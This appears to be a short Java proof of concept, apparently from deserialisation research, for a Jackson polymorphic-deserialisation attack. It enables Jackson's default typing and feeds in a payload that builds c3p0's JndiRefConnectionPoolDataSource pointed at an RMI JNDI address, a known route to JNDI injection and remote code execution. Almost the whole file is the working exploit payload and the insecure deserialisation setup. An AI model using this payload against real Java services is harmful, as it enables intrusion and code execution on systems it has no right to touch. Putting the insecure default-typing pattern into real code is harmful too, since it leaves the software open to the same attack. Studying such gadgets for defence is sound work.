package c3p0;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class jndI {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\",{\"jndiName\":\"rmi://localhost:1099/Hello\",\"loginTimeout\":\"0\"}]";

        Object o = mapper.readValue(payload, Object.class);
    }
}
